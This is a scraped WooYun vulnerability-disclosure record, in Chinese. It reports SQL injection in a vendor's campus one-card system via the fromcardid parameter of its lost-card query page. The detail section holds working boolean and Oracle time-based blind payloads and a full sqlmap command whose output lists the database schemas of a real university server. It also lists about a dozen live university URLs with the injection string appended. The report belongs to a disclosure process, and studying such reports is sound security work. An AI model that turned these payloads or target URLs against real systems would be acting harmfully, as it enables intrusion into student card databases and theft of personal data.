{"id": 43909, "wybug_id": "wooyun-2014-081299", "wybug_title": "某通用型校园一卡通系统SQL注入漏洞", "wybug_corp": "新中新电子", "wybug_author": "路人甲", "wybug_date": "2014-10-30 18:55", "wybug_open_date": "2015-01-28 18:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向公众公开  简要描述： RT 详细说明：  新中新校园一卡通系统某处过滤不严导致SQL注入漏洞,影响大量高校百度搜索： 版权所有:新中新电子 版本号:2.3\n\n\n新中新校园一卡通系统在“失卡信息查询”功能实现上存在SQL注入漏洞漏洞链接：/nFixcardAllList.action?fromcardid=Payload1：fromcardid=1'+or+'a'='aPayload2：fromcardid=1'+and+0=DBMS_PIPE.RECEIVE_MESSAGE('a',4)+and+'a'='a\n   漏洞证明：  \n以http://www.ecard.ldu.edu.cn 作为测试案例测试链接：http://ecard.hycollege.net/nFixcardAllList.action?fromcardid=11)手工注入测试http://ecard.hycollege.net/nFixcardAllList.action?fromcardid=1'+or+'a'='ahttp://ecard.hycollege.net/nFixcardAllList.action?fromcardid=1'+or+'a'='b\n\n2)SQLMAP注入$ sqlmap -u http://www.ecard.ldu.edu.cn/nFixcardAllList.action?fromcardid=1   --dbms oracle --level 5 --risk 3 --technique=T --time-sec 4  --dbs -v 3---Place: GETParameter: fromcardid    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: fromcardid=aaaaa' AND 5322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(70)||CHR(83)||CHR(100),4) AND 'nMBn'='nMBn---web application technology: JSPback-end DBMS: Oracle---Place: GETParameter: uname    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: uname=-5521' OR (5703=5703) AND 'vuSP'='vuSP    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: uname=-2602' OR 4089=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(76)||CHR(71)||CHR(98),5) AND 'hHeH'='hHeH---[21:39:07] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[21:39:07] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names[21:39:07] [INFO] fetching database (schema) names[21:39:07] [INFO] fetching number of databases[21:39:08] [WARNING] reflective value(s) found and filtering out[21:39:08] [INFO] resumed: 16[21:39:08] [INFO] resumed: CTXSYS[21:39:08] [INFO] resumed: DBSNMP[21:39:08] [INFO] resumed: DMSYS[21:39:08] [INFO] resumed: EXFSYS[21:39:08] [INFO] resumed: IDDBUSER[21:39:08] [INFO] resumed: MDSYS[21:39:08] [INFO] resumed: OLAPSYS[21:39:08] [INFO] resumed: ORDSYS[21:39:08] [INFO] resumed: OUTLN[21:39:08] [INFO] resumed: SCHOOL[21:39:08] [INFO] resumed: SYS[21:39:08] [INFO] resumed: SYSMAN[21:39:08] [INFO] resumed: SYSTEM[21:39:08] [INFO] resumed: TSMSYS[21:39:08] [INFO] resumed: WMSYS[21:39:08] [INFO] resumed: XDBavailable databases [16]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] IDDBUSER[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCHOOL[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n\n\n\n\n\n\n\n\n\n\n\n\n\n其他测试案例：（仅仅列出一部分）http://ecard.hycollege.net/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://yktcx.tjut.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://xyk.jlnu.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://ecard.qau.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://yktcx.njmu.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://ykt.hebut.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://ecard.sdu.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://www.ecard.ldu.edu.cn//nFixcardAllList.action?fromcardid=1'+or+'a'='a http://ecard.tyut.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://ecard.hycollege.net/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://ecard.tjufe.edu.cn/nFixcardAllList.action?fromcardid=1'+or+'a'='a http://ecard.hycollege.net/nFixcardAllList.action?fromcardid=1'+or+'a'='a\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-11-03 17:59 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}